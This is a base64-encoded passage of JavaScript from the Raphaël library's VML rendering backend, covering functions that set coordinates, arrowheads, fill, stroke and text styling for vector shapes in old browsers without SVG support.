TsgaSsrKSB7XG4gICAgICAgICAgICAgICAgcCA9IHBhW2ldO1xuICAgICAgICAgICAgICAgIHIgPSBwYVtpXVswXS50b0xvd2VyQ2FzZSgpO1xuICAgICAgICAgICAgICAgIHIgPT0gXCJ6XCIgJiYgKHIgPSBcInhcIik7XG4gICAgICAgICAgICAgICAgZm9yICh2YXIgaiA9IDEsIGpqID0gcC5sZW5ndGg7IGogPCBqajsgaisrKSB7XG4gICAgICAgICAgICAgICAgICAgIHIgKz0gcm91bmQocFtqXSAqIHpvb20pICsgKGogIT0gamogLSAxID8gXCIsXCIgOiBFKTtcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgcmVzLnB1c2gocik7XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICByZXR1cm4gcmVzLmpvaW4oUyk7XG4gICAgICAgIH0sXG4gICAgICAgIGNvbXBlbnNhdGlvbiA9IGZ1bmN0aW9uIChkZWcsIGR4LCBkeSkge1xuICAgICAgICAgICAgdmFyIG0gPSBSLm1hdHJpeCgpO1xuICAgICAgICAgICAgbS5yb3RhdGUoLWRlZywgLjUsIC41KTtcbiAgICAgICAgICAgIHJldHVybiB7XG4gICAgICAgICAgICAgICAgZHg6IG0ueChkeCwgZHkpLFxuICAgICAgICAgICAgICAgIGR5OiBtLnkoZHgsIGR5KVxuICAgICAgICAgICAgfTtcbiAgICAgICAgfSxcbiAgICAgICAgc2V0Q29vcmRzID0gZnVuY3Rpb24gKHAsIHN4LCBzeSwgZHgsIGR5LCBkZWcpIHtcbiAgICAgICAgICAgIHZhciBfID0gcC5fLFxuICAgICAgICAgICAgICAgIG0gPSBwLm1hdHJpeCxcbiAgICAgICAgICAgICAgICBmaWxscG9zID0gXy5maWxscG9zLFxuICAgICAgICAgICAgICAgIG8gPSBwLm5vZGUsXG4gICAgICAgICAgICAgICAgcyA9IG8uc3R5bGUsXG4gICAgICAgICAgICAgICAgeSA9IDEsXG4gICAgICAgICAgICAgICAgZmxpcCA9IFwiXCIsXG4gICAgICAgICAgICAgICAgZHhkeSxcbiAgICAgICAgICAgICAgICBreCA9IHpvb20gLyBzeCxcbiAgICAgICAgICAgICAgICBreSA9IHpvb20gLyBzeTtcbiAgICAgICAgICAgIHMudmlzaWJpbGl0eSA9IFwiaGlkZGVuXCI7XG4gICAgICAgICAgICBpZiAoIXN4IHx8ICFzeSkge1xuICAgICAgICAgICAgICAgIHJldHVybjtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIG8uY29vcmRzaXplID0gYWJzKGt4KSArIFMgKyBhYnMoa3kpO1xuICAgICAgICAgICAgcy5yb3RhdGlvbiA9IGRlZyAqIChzeCAqIHN5IDwgMCA/IC0xIDogMSk7XG4gICAgICAgICAgICBpZiAoZGVnKSB7XG4gICAgICAgICAgICAgICAgdmFyIGMgPSBjb21wZW5zYXRpb24oZGVnLCBkeCwgZHkpO1xuICAgICAgICAgICAgICAgIGR4ID0gYy5keDtcbiAgICAgICAgICAgICAgICBkeSA9IGMuZHk7XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICBzeCA8IDAgJiYgKGZsaXAgKz0gXCJ4XCIpO1xuICAgICAgICAgICAgc3kgPCAwICYmIChmbGlwICs9IFwiIHlcIikgJiYgKHkgPSAtMSk7XG4gICAgICAgICAgICBzLmZsaXAgPSBmbGlwO1xuICAgICAgICAgICAgby5jb29yZG9yaWdpbiA9IChkeCAqIC1reCkgKyBTICsgKGR5ICogLWt5KTtcbiAgICAgICAgICAgIGlmIChmaWxscG9zIHx8IF8uZmlsbHNpemUpIHtcbiAgICAgICAgICAgICAgICB2YXIgZmlsbCA9IG8uZ2V0RWxlbWVudHNCeVRhZ05hbWUoZmlsbFN0cmluZyk7XG4gICAgICAgICAgICAgICAgZmlsbCA9IGZpbGwgJiYgZmlsbFswXTtcbiAgICAgICAgICAgICAgICBvLnJlbW92ZUNoaWxkKGZpbGwpO1xuICAgICAgICAgICAgICAgIGlmIChmaWxscG9zKSB7XG4gICAgICAgICAgICAgICAgICAgIGMgPSBjb21wZW5zYXRpb24oZGVnLCBtLngoZmlsbHBvc1swXSwgZmlsbHBvc1sxXSksIG0ueShmaWxscG9zWzBdLCBmaWxscG9zWzFdKSk7XG4gICAgICAgICAgICAgICAgICAgIGZpbGwucG9zaXRpb24gPSBjLmR4ICogeSArIFMgKyBjLmR5ICogeTtcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgaWYgKF8uZmlsbHNpemUpIHtcbiAgICAgICAgICAgICAgICAgICAgZmlsbC5zaXplID0gXy5maWxsc2l6ZVswXSAqIGFicyhzeCkgKyBTICsgXy5maWxsc2l6ZVsxXSAqIGFicyhzeSk7XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIG8uYXBwZW5kQ2hpbGQoZmlsbCk7XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICBzLnZpc2liaWxpdHkgPSBcInZpc2libGVcIjtcbiAgICAgICAgfTtcbiAgICBSLnRvU3RyaW5nID0gZnVuY3Rpb24gKCkge1xuICAgICAgICByZXR1cm4gIFwiWW91ciBicm93c2VyIGRvZXNuXFx1MjAxOXQgc3VwcG9ydCBTVkcuIEZhbGxpbmcgZG93biB0byBWTUwuXFxuWW91IGFyZSBydW5uaW5nIFJhcGhhXFx4ZWJsIFwiICsgdGhpcy52ZXJzaW9uO1xuICAgIH07XG4gICAgdmFyIGFkZEFycm93ID0gZnVuY3Rpb24gKG8sIHZhbHVlLCBpc0VuZCkge1xuICAgICAgICB2YXIgdmFsdWVzID0gU3RyKHZhbHVlKS50b0xvd2VyQ2FzZSgpLnNwbGl0KFwiLVwiKSxcbiAgICAgICAgICAgIHNlID0gaXNFbmQgPyBcImVuZFwiIDogXCJzdGFydFwiLFxuICAgICAgICAgICAgaSA9IHZhbHVlcy5sZW5ndGgsXG4gICAgICAgICAgICB0eXBlID0gXCJjbGFzc2ljXCIsXG4gICAgICAgICAgICB3ID0gXCJtZWRpdW1cIixcbiAgICAgICAgICAgIGggPSBcIm1lZGl1bVwiO1xuICAgICAgICB3aGlsZSAoaS0tKSB7XG4gICAgICAgICAgICBzd2l0Y2ggKHZhbHVlc1tpXSkge1xuICAgICAgICAgICAgICAgIGNhc2UgXCJibG9ja1wiOlxuICAgICAgICAgICAgICAgIGNhc2UgXCJjbGFzc2ljXCI6XG4gICAgICAgICAgICAgICAgY2FzZSBcIm92YWxcIjpcbiAgICAgICAgICAgICAgICBjYXNlIFwiZGlhbW9uZFwiOlxuICAgICAgICAgICAgICAgIGNhc2UgXCJvcGVuXCI6XG4gICAgICAgICAgICAgICAgY2FzZSBcIm5vbmVcIjpcbiAgICAgICAgICAgICAgICAgICAgdHlwZSA9IHZhbHVlc1tpXTtcbiAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICAgICAgY2FzZSBcIndpZGVcIjpcbiAgICAgICAgICAgICAgICBjYXNlIFwibmFycm93XCI6IGggPSB2YWx1ZXNbaV07IGJyZWFrO1xuICAgICAgICAgICAgICAgIGNhc2UgXCJsb25nXCI6XG4gICAgICAgICAgICAgICAgY2FzZSBcInNob3J0XCI6IHcgPSB2YWx1ZXNbaV07IGJyZWFrO1xuICAgICAgICAgICAgfVxuICAgICAgICB9XG4gICAgICAgIHZhciBzdHJva2UgPSBvLm5vZGUuZ2V0RWxlbWVudHNCeVRhZ05hbWUoXCJzdHJva2VcIilbMF07XG4gICAgICAgIHN0cm9rZVtzZSArIFwiYXJyb3dcIl0gPSB0eXBlO1xuICAgICAgICBzdHJva2Vbc2UgKyBcImFycm93bGVuZ3RoXCJdID0gdztcbiAgICAgICAgc3Ryb2tlW3NlICsgXCJhcnJvd3dpZHRoXCJdID0gaDtcbiAgICB9LFxuICAgIHNldEZpbGxBbmRTdHJva2UgPSBmdW5jdGlvbiAobywgcGFyYW1zKSB7XG4gICAgICAgIC8vIG8ucGFwZXIuY2FudmFzLnN0eWxlLmRpc3BsYXkgPSBcIm5vbmVcIjtcbiAgICAgICAgby5hdHRycyA9IG8uYXR0cnMgfHwge307XG4gICAgICAgIHZhciBub2RlID0gby5ub2RlLFxuICAgICAgICAgICAgYSA9IG8uYXR0cnMsXG4gICAgICAgICAgICBzID0gbm9kZS5zdHlsZSxcbiAgICAgICAgICAgIHh5LFxuICAgICAgICAgICAgbmV3cGF0aCA9IHBhdGhUeXBlc1tvLnR5cGVdICYmIChwYXJhbXMueCAhPSBhLnggfHwgcGFyYW1zLnkgIT0gYS55IHx8IHBhcmFtcy53aWR0aCAhPSBhLndpZHRoIHx8IHBhcmFtcy5oZWlnaHQgIT0gYS5oZWlnaHQgfHwgcGFyYW1zLmN4ICE9IGEuY3ggfHwgcGFyYW1zLmN5ICE9IGEuY3kgfHwgcGFyYW1zLnJ4ICE9IGEucnggfHwgcGFyYW1zLnJ5ICE9IGEucnkgfHwgcGFyYW1zLnIgIT0gYS5yKSxcbiAgICAgICAgICAgIGlzT3ZhbCA9IG92YWxUeXBlc1tvLnR5cGVdICYmIChhLmN4ICE9IHBhcmFtcy5jeCB8fCBhLmN5ICE9IHBhcmFtcy5jeSB8fCBhLnIgIT0gcGFyYW1zLnIgfHwgYS5yeCAhPSBwYXJhbXMucnggfHwgYS5yeSAhPSBwYXJhbXMucnkpLFxuICAgICAgICAgICAgcmVzID0gbztcblxuXG4gICAgICAgIGZvciAodmFyIHBhciBpbiBwYXJhbXMpIGlmIChwYXJhbXNbaGFzXShwYXIpKSB7XG4gICAgICAgICAgICBhW3Bhcl0gPSBwYXJhbXNbcGFyXTtcbiAgICAgICAgfVxuICAgICAgICBpZiAobmV3cGF0aCkge1xuICAgICAgICAgICAgYS5wYXRoID0gUi5fZ2V0UGF0aFtvLnR5cGVdKG8pO1xuICAgICAgICAgICAgby5fLmRpcnR5ID0gMTtcbiAgICAgICAgfVxuICAgICAgICBwYXJhbXMuaHJlZiAmJiAobm9kZS5ocmVmID0gcGFyYW1zLmhyZWYpO1xuICAgICAgICBwYXJhbXMudGl0bGUgJiYgKG5vZGUudGl0bGUgPSBwYXJhbXMudGl0bGUpO1xuICAgICAgICBwYXJhbXMudGFyZ2V0ICYmIChub2RlLnRhcmdldCA9IHBhcmFtcy50YXJnZXQpO1xuICAgICAgICBwYXJhbXMuY3Vyc29yICYmIChzLmN1cnNvciA9IHBhcmFtcy5jdXJzb3IpO1xuICAgICAgICBcImJsdXJcIiBpbiBwYXJhbXMgJiYgby5ibHVyKHBhcmFtcy5ibHVyKTtcbiAgICAgICAgaWYgKHBhcmFtcy5wYXRoICYmIG8udHlwZSA9PSBcInBhdGhcIiB8fCBuZXdwYXRoKSB7XG4gICAgICAgICAgICBub2RlLnBhdGggPSBwYXRoMnZtbCh+U3RyKGEucGF0aCkudG9Mb3dlckNhc2UoKS5pbmRleE9mKFwiclwiKSA/IFIuX3BhdGhUb0Fic29sdXRlKGEucGF0aCkgOiBhLnBhdGgpO1xuICAgICAgICAgICAgby5fLmRpcnR5ID0gMTtcbiAgICAgICAgICAgIGlmIChvLnR5cGUgPT0gXCJpbWFnZVwiKSB7XG4gICAgICAgICAgICAgICAgby5fLmZpbGxwb3MgPSBbYS54LCBhLnldO1xuICAgICAgICAgICAgICAgIG8uXy5maWxsc2l6ZSA9IFthLndpZHRoLCBhLmhlaWdodF07XG4gICAgICAgICAgICAgICAgc2V0Q29vcmRzKG8sIDEsIDEsIDAsIDAsIDApO1xuICAgICAgICAgICAgfVxuICAgICAgICB9XG4gICAgICAgIFwidHJhbnNmb3JtXCIgaW4gcGFyYW1zICYmIG8udHJhbnNmb3JtKHBhcmFtcy50cmFuc2Zvcm0pO1xuICAgICAgICBpZiAoaXNPdmFsKSB7XG4gICAgICAgICAgICB2YXIgY3ggPSArYS5jeCxcbiAgICAgICAgICAgICAgICBjeSA9ICthLmN5LFxuICAgICAgICAgICAgICAgIHJ4ID0gK2EucnggfHwgK2EuciB8fCAwLFxuICAgICAgICAgICAgICAgIHJ5ID0gK2EucnkgfHwgK2EuciB8fCAwO1xuICAgICAgICAgICAgbm9kZS5wYXRoID0gUi5mb3JtYXQoXCJhcnswfSx7MX0sezJ9LHszfSx7NH0sezF9LHs0fSx7MX14XCIsIHJvdW5kKChjeCAtIHJ4KSAqIHpvb20pLCByb3VuZCgoY3kgLSByeSkgKiB6b29tKSwgcm91bmQoKGN4ICsgcngpICogem9vbSksIHJvdW5kKChjeSArIHJ5KSAqIHpvb20pLCByb3VuZChjeCAqIHpvb20pKTtcbiAgICAgICAgICAgIG8uXy5kaXJ0eSA9IDE7XG4gICAgICAgIH1cbiAgICAgICAgaWYgKFwiY2xpcC1yZWN0XCIgaW4gcGFyYW1zKSB7XG4gICAgICAgICAgICB2YXIgcmVjdCA9IFN0cihwYXJhbXNbXCJjbGlwLXJlY3RcIl0pLnNwbGl0KHNlcGFyYXRvcik7XG4gICAgICAgICAgICBpZiAocmVjdC5sZW5ndGggPT0gNCkge1xuICAgICAgICAgICAgICAgIHJlY3RbMl0gPSArcmVjdFsyXSArICgrcmVjdFswXSk7XG4gICAgICAgICAgICAgICAgcmVjdFszXSA9ICtyZWN0WzNdICsgKCtyZWN0WzFdKTtcbiAgICAgICAgICAgICAgICB2YXIgZGl2ID0gbm9kZS5jbGlwUmVjdCB8fCBSLl9nLmRvYy5jcmVhdGVFbGVtZW50KFwiZGl2XCIpLFxuICAgICAgICAgICAgICAgICAgICBkc3R5bGUgPSBkaXYuc3R5bGU7XG4gICAgICAgICAgICAgICAgZHN0eWxlLmNsaXAgPSBSLmZvcm1hdChcInJlY3QoezF9cHggezJ9cHggezN9cHggezB9cHgpXCIsIHJlY3QpO1xuICAgICAgICAgICAgICAgIGlmICghbm9kZS5jbGlwUmVjdCkge1xuICAgICAgICAgICAgICAgICAgICBkc3R5bGUucG9zaXRpb24gPSBcImFic29sdXRlXCI7XG4gICAgICAgICAgICAgICAgICAgIGRzdHlsZS50b3AgPSAwO1xuICAgICAgICAgICAgICAgICAgICBkc3R5bGUubGVmdCA9IDA7XG4gICAgICAgICAgICAgICAgICAgIGRzdHlsZS53aWR0aCA9IG8ucGFwZXIud2lkdGggKyBcInB4XCI7XG4gICAgICAgICAgICAgICAgICAgIGRzdHlsZS5oZWlnaHQgPSBvLnBhcGVyLmhlaWdodCArIFwicHhcIjtcbiAgICAgICAgICAgICAgICAgICAgbm9kZS5wYXJlbnROb2RlLmluc2VydEJlZm9yZShkaXYsIG5vZGUpO1xuICAgICAgICAgICAgICAgICAgICBkaXYuYXBwZW5kQ2hpbGQobm9kZSk7XG4gICAgICAgICAgICAgICAgICAgIG5vZGUuY2xpcFJlY3QgPSBkaXY7XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgfVxuICAgICAgICAgICAgaWYgKCFwYXJhbXNbXCJjbGlwLXJlY3RcIl0pIHtcbiAgICAgICAgICAgICAgICBub2RlLmNsaXBSZWN0ICYmIChub2RlLmNsaXBSZWN0LnN0eWxlLmNsaXAgPSBcImF1dG9cIik7XG4gICAgICAgICAgICB9XG4gICAgICAgIH1cbiAgICAgICAgaWYgKG8udGV4dHBhdGgpIHtcbiAgICAgICAgICAgIHZhciB0ZXh0cGF0aFN0eWxlID0gby50ZXh0cGF0aC5zdHlsZTtcbiAgICAgICAgICAgIHBhcmFtcy5mb250ICYmICh0ZXh0cGF0aFN0eWxlLmZvbnQgPSBwYXJhbXMuZm9udCk7XG4gICAgICAgICAgICBwYXJhbXNbXCJmb250LWZhbWlseVwiXSAmJiAodGV4dHBhdGhTdHlsZS5mb250RmFtaWx5ID0gJ1wiJyArIHBhcmFtc1tcImZvbnQtZmFtaWx5XCJdLnNwbGl0KFwiLFwiKVswXS5yZXBsYWNlKC9eWydcIl0rfFsnXCJdKyQvZywgRSkgKyAnXCInKTtcbiAgICAgICAgICAgIHBhcmFtc1tcImZvbnQtc2l6ZVwiXSAmJiAodGV4dHBhdGhTdHlsZS5mb250U2l6ZSA9IHBhcmFtc1tcImZvbnQtc2l6ZVwiXSk7XG4gICAgICAgICAgICBwYXJhbXNbXCJmb250LXdlaWdodFwiXSAmJiAodGV4dHBhdGhTdHlsZS5mb250V2VpZ2h0ID0gcGFyYW1zW1wiZm9udC13ZWlnaHRcIl0pO1xuICAgICAgICAgICAgcGFyYW1zW1wiZm9udC1zdHlsZVwiXSAmJiAodGV4dHBhdGhTdHlsZS5mb250U3R5bGUgPSBwYXJhbXNbXCJmb250LXN0eWxlXCJdKTtcbiAgICAgICAgfVxuICAgICAgICBpZiAoXCJhcnJvdy1zdGFydFwiIGluIHBhcmFtcykge1xuICAgICAgICAgICAgYWRkQXJyb3cocmVzLCBwYXJhbXNbXCJhcnJvdy1zdGFydFwiXSk7XG4gICAgICAgIH1cbiAgICAgICAgaWYgKFwiYXJyb3ctZW5kXCIgaW4gcGFyYW1zKSB7XG4gICAgICAgICAgICBhZGRBcnJvdyhyZXMsIHBhcmFtc1tcImFycm93LWVuZFwiXSwgMSk7XG4gICAgICAgIH1cbiAgICAgICAgaWYgKHBhcmFtcy5vcGFjaXR5ICE9IG51bGwgfHxcbiAgICAgICAgICAgIHBhcmFtcy5maWxsICE9IG51bGwgfHxcbiAgICAgICAgICAgIHBhcmFtcy5zcmMgIT0gbnVsbCB8fFxuICAgICAgICAgICAgcGFyYW1zLnN0cm9rZSAhPSBudWxsIHx8XG4gICAgICAgICAgICBwYXJhbXNbXCJzdHJva2Utd2lkdGhcIl0gIT0gbnVsbCB8fFxuICAgICAgICAgICAgcGFyYW1zW1wic3Ryb2tlLW9wYWNpdHlcIl0gIT0gbnVsbCB8fFxuICAgICAgICAgICAgcGFyYW1zW1wiZmlsbC1vcGFjaXR5XCJdICE9IG51bGwgfHxcbiAgICAgICAgICAgIHBhcmFtc1tcInN0cm9rZS1kYXNoYXJyYXlcIl0gIT0gbnVsbCB8fFxuICAgICAgICAgICAgcGFyYW1zW1wic3Ryb2tlLW1pdGVybGltaXRcIl0gIT0gbnVsbCB8fFxuICAgICAgICAgICAgcGFyYW1zW1wic3Ryb2tlLWxpbmVqb2luXCJdICE9IG51bGwgfHxcbiAgICAgICAgICAgIHBhcmFtc1tcInN0cm9rZS1saW5lY2FwXCJdICE9IG51bGwpIHtcbiAgICAgICAgICAgIHZhciBmaWxsID0gbm9kZS5nZXRFbGVtZW50c0J5VGFnTmFtZShmaWxsU3RyaW5nKSxcbiAgICAgICAgICAgICAgICBuZXdmaWxsID0gZmFsc2U7XG4gICAgICAgICAgICBmaWxsID0gZmlsbCAmJiBmaWxsWzBdO1xuICAgICAgICAgICAgIWZpbGwgJiYgKG5ld2ZpbGwgPSBmaWxsID0gY3JlYXRlTm9kZShmaWxsU3RyaW5nKSk7XG4gICAgICAgICAgICBpZiAoby50eXBlID09IFwiaW1hZ2VcIiAmJiBwYXJhbXMuc3JjKSB7XG4gICAgICAgICAgICAgICAgZmlsbC5zcmMgPSBwYXJhbXMuc3JjO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgcGFyYW1zLmZpbGwgJiYgKGZpbGwub24gPSB0cnVlKTtcbiAgICAgICAgICAgIGlmIChmaWxsLm9uID09IG51bGwgfHwgcGFyYW1zLmZpbGwgPT0gXCJub25lXCIgfHwgcGFyYW1zLmZpbGwgPT09IG51bGwpIHtcbiAgICAgICAgICAgICAgICBmaWxsLm9uID0gZmFsc2U7XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICBpZiAoZmlsbC5vbiAmJiBwYXJhbXMuZmlsbCkge1xuICAgICAgICAgICAgICAgIHZhciBpc1VSTCA9IFN0cihwYXJhbXMuZmlsbCkubWF0Y2goUi5fSVNVUkwpO1xuICAgICAgICAgICAgICAgIGlmIChpc1VSTCkge1xuICAgICAgICAgICAgICAgICAgICBmaWxsLnBhcmVudE5vZGUgPT0gbm9kZSAmJiBub2RlLnJlbW92ZUNoaWxkKGZpbGwpO1xuICAgICAgICAgICAgICAgICAgICBmaWxsLnJvdGF0ZSA9IHRydWU7XG4gICAgICAgICAgICAgICAgICAgIGZpbGwuc3JjID0gaXNVUkxbMV07XG4gICAgICAgICAgICAgICAgICAgIGZpbGwudHlwZSA9IFwidGlsZVwiO1xuICAgICAgICAgICAgICAgICAgICB2YXIgYmJveCA9IG8uZ2V0QkJveCgxKTtcbiAgICAgICAgICAgICAgICAgICAgZmlsbC5wb3NpdGlvbiA9IGJib3gueCArIFMgKyBiYm94Lnk7XG4gICAgICAgICAgICAgICAgICAgIG8uXy5maWxscG9zID0gW2Jib3gueCwgYmJveC55XTtcblxuICAgICAgICAgICAgICAgICAgICBSLl9wcmVsb2FkKGlzVVJMWzFdLCBmdW5jdGlvbiAoKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBvLl8uZmlsbHNpemUgPSBbdGhpcy5vZmZzZXRXaWR0aCwgdGhpcy5vZmZzZXRIZWlnaHRdO1xuICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgICAgICAgICBmaWxsLmNvbG9yID0gUi5nZXRSR0IocGFyYW1zLmZpbGwpLmhleDtcbiAgICAgICAgICAgICAgICAgICAgZmlsbC5zcmMgPSBFO1xuICAgICAgICAgICAgICAgICAgICBmaWxsLnR5cGUgPSBcInNvbGlkXCI7XG4gICAgICAgICAgICAgICAgICAgIGlmIChSLmdldFJHQihwYXJhbXMuZmlsbCkuZXJyb3IgJiYgKHJlcy50eXBlIGluIHtjaXJjbGU6IDEsIGVsbGlwc2U6IDF9IHx8IFN0cihwYXJhbXMuZmlsbCkuY2hhckF0KCkgIT0gXCJyXCIpICYmIGFkZEdyYWRpZW50RmlsbChyZXMsIHBhcmFtcy5maWxsLCBmaWxsKSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgYS5maWxsID0gXCJub25lXCI7XG4gICAgICAgICAgICAgICAgICAgICAgICBhLmdyYWRpZW50ID0gcGFyYW1zLmZpbGw7XG4gICAgICAgICAgICAgICAgICAgICAgICBmaWxsLnJvdGF0ZSA9IGZhbHNlO1xuICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgfVxuICAgICAgICAgICAgaWYgKFwiZmlsbC1vcGFjaXR5XCIgaW4gcGFyYW1zIHx8IFwib3BhY2l0eVwiIGluIHBhcmFtcykge1xuICAgICAgICAgICAgICAgIHZhciBvcGFjaXR5ID0gKCgrYVtcImZpbGwtb3BhY2l0eVwiXSArIDEgfHwgMikgLSAxKSAqICgoK2Eub3BhY2l0eSArIDEgfHwgMikgLSAxKSAqICgoK1IuZ2V0UkdCKHBhcmFtcy5maWxsKS5vICsgMSB8fCAyKSAtIDEpO1xuICAgICAgICAgICAgICAgIG9wYWNpdHkgPSBtbWluKG1tYXgob3BhY2l0eSwgMCksIDEpO1xuICAgICAgICAgICAgICAgIGZpbGwub3BhY2l0eSA9IG9wYWNpdHk7XG4gICAgICAgICAgICAgICAgaWYgKGZpbGwuc3JjKSB7XG4gICAgICAgICAgICAgICAgICAgIGZpbGwuY29sb3IgPSBcIm5vbmVcIjtcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICBub2RlLmFwcGVuZENoaWxkKGZpbGwpO1xuICAgICAgICAgICAgdmFyIHN0cm9rZSA9IChub2RlLmdldEVsZW1lbnRzQnlUYWdOYW1lKFwic3Ryb2tlXCIpICYmIG5vZGUuZ2V0RWxlbWVudHNCeVRhZ05hbWUoXCJzdHJva2VcIilbMF0pLFxuICAgICAgICAgICAgbmV3c3Ryb2tlID0gZmFsc2U7XG4gICAgICAgICAgICAhc3Ryb2tlICYmIChuZXdzdHJva2UgPSBzdHJva2UgPSBjcmVhdGVOb2RlKFwic3Ryb2tlXCIpKTtcbiAgICAgICAgICAgIGlmICgocGFyYW1zLnN0cm9rZSAmJiBwYXJhbXMuc3Ryb2tlICE9IFwibm9uZVwiKSB8fFxuICAgICAgICAgICAgICAgIHBhcmFtc1tcInN0cm9rZS13aWR0aFwiXSB8fFxuICAgICAgICAgICAgICAgIHBhcmFtc1tcInN0cm9rZS1vcGFjaXR5XCJdICE9IG51bGwgfHxcbiAgICAgICAgICAgICAgICBwYXJhbXNbXCJzdHJva2UtZGFzaGFycmF5XCJdIHx8XG4gICAgICAgICAgICAgICAgcGFyYW1zW1wic3Ryb2tlLW1pdGVybGltaXRcIl0gfHxcbiAgICAgICAgICAgICAgICBwYXJhbXNbXCJzdHJva2UtbGluZWpvaW5cIl0gfHxcbiAgICAgICAgICAgICAgICBwYXJhbXNbXCJzdHJva2UtbGluZWNhcFwiXSkge1xuICAgICAgICAgICAgICAgIHN0cm9rZS5vbiA9IHRydWU7XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICAocGFyYW1zLnN0cm9rZSA9PSBcIm5vbmVcIiB8fCBwYXJhbXMuc3Ryb2tlID09PSBudWxsIHx8IHN0cm9rZS5vbiA9PSBudWxsIHx8IHBhcmFtcy5zdHJva2UgPT0gMCB8fCBwYXJhbXNbXCJzdHJva2Utd2lkdGhcIl0gPT0gMCkgJiYgKHN0cm9rZS5vbiA9IGZhbHNlKTtcbiAgICAgICAgICAgIHZhciBzdHJva2VDb2xvciA9IFIuZ2V0UkdCKHBhcmFtcy5zdHJva2UpO1xuICAgICAgICAgICAgc3Ryb2tlLm9uICYmIHBhcmFtcy5zdHJva2UgJiYgKHN0cm9rZS5jb2xvciA9IHN0cm9rZUNvbG9yLmhleCk7XG4gICAgICAgICAgICBvcGFjaXR5ID0gKCgrYVtcInN0cm9rZS1vcGFjaXR5XCJdICsgMSB8fCAyKSAtIDEpICogKCgrYS5vcGFjaXR5ICsgMSB8fCAyKSAtIDEpICogKCgrc3Ryb2tlQ29sb3IubyArIDEgfHwgMikgLSAxKTtcbiAgICAgICAgICAgIHZhciB3aWR0aCA9ICh0b0Zsb2F0KHBhcmFtc1tcInN0cm9rZS13aWR0aFwiXSkgfHwgMSkgKiAuNzU7XG4gICAgICAgICAgICBvcGFjaXR5ID0gbW1pbihtbWF4KG9wYWNpdHksIDApLCAxKTtcbiAgICAgICAgICAgIHBhcmFtc1tcInN0cm9rZS13aWR0aFwiXSA9PSBudWxsICYmICh3aWR0aCA9IGFbXCJzdHJva2Utd2lkdGhcIl0pO1xuICAgICAgICAgICAgcGFyYW1zW1wic3Ryb2tlLXdpZHRoXCJdICYmIChzdHJva2Uud2VpZ2h0ID0gd2lkdGgpO1xuICAgICAgICAgICAgd2lkdGggJiYgd2lkdGggPCAxICYmIChvcGFjaXR5ICo9IHdpZHRoKSAmJiAoc3Ryb2tlLndlaWdodCA9IDEpO1xuICAgICAgICAgICAgc3Ryb2tlLm9wYWNpdHkgPSBvcGFjaXR5O1xuXG4gICAgICAgICAgICBwYXJhbXNbXCJzdHJva2UtbGluZWpvaW5cIl0gJiYgKHN0cm9rZS5qb2luc3R5bGUgPSBwYXJhbXNbXCJzdHJva2UtbGluZWpvaW5cIl0gfHwgXCJtaXRlclwiKTtcbiAgICAgICAgICAgIHN0cm9rZS5taXRlcmxpbWl0ID0gcGFyYW1zW1wic3Ryb2tlLW1pdGVybGltaXRcIl0gfHwgODtcbiAgICAgICAgICAgIHBhcmFtc1tcInN0cm9rZS1saW5lY2FwXCJdICYmIChzdHJva2UuZW5kY2FwID0gcGFyYW1zW1wic3Ryb2tlLWxpbmVjYXBcIl0gPT0gXCJidXR0XCIgPyBcImZsYXRcIiA6IHBhcmFtc1tcInN0cm9rZS1saW5lY2FwXCJdID09IFwic3F1YXJlXCIgPyBcInNxdWFyZVwiIDogXCJyb3VuZFwiKTtcbiAgICAgICAgICAgIGlmIChcInN0cm9rZS1kYXNoYXJyYXlcIiBpbiBwYXJhbXMpIHtcbiAgICAgICAgICAgICAgICB2YXIgZGFzaGFycmF5ID0ge1xuICAgICAgICAgICAgICAgICAgICBcIi1cIjogXCJzaG9ydGRhc2hcIixcbiAgICAgICAgICAgICAgICAgICAgXCIuXCI6IFwic2hvcnRkb3RcIixcbiAgICAgICAgICAgICAgICAgICAgXCItLlwiOiBcInNob3J0ZGFzaGRvdFwiLFxuICAgICAgICAgICAgICAgICAgICBcIi0uLlwiOiBcInNob3J0ZGFzaGRvdGRvdFwiLFxuICAgICAgICAgICAgICAgICAgICBcIi4gXCI6IFwiZG90XCIsXG4gICAgICAgICAgICAgICAgICAgIFwiLSBcIjogXCJkYXNoXCIsXG4gICAgICAgICAgICAgICAgICAgIFwiLS1cIjogXCJsb25nZGFzaFwiLFxuICAgICAgICAgICAgICAgICAgICBcIi0gLlwiOiBcImRhc2hkb3RcIixcbiAgICAgICAgICAgICAgICAgICAgXCItLS5cIjogXCJsb25nZGFzaGRvdFwiLFxuICAgICAgICAgICAgICAgICAgICBcIi0tLi5cIjogXCJsb25nZGFzaGRvdGRvdFwiXG4gICAgICAgICAgICAgICAgfTtcbiAgICAgICAgICAgICAgICBzdHJva2UuZGFzaHN0eWxlID0gZGFzaGFycmF5W2hhc10ocGFyYW1zW1wic3Ryb2tlLWRhc2hhcnJheVwiXSkgPyBkYXNoYXJyYXlbcGFyYW1zW1wic3Ryb2tlLWRhc2hhcnJheVwiXV0gOiBFO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgbmV3c3Ryb2tlICYmIG5vZGUuYXBwZW5kQ2hpbGQoc3Ryb2tlKTtcbiAgICAgICAgfVxuICAgICAgICBpZiAocmVzLnR5cGUgPT0gXCJ0ZXh0XCIpIHtcbiAgICAgICAgICAgIHJlcy5wYXBlci5jYW52YXMuc3R5bGUuZGlzcGxheSA9IEU7XG4gICAgICAgICAgICB2YXIgc3BhbiA9IHJlcy5wYXBlci5zcGFuLFxuICAgICAg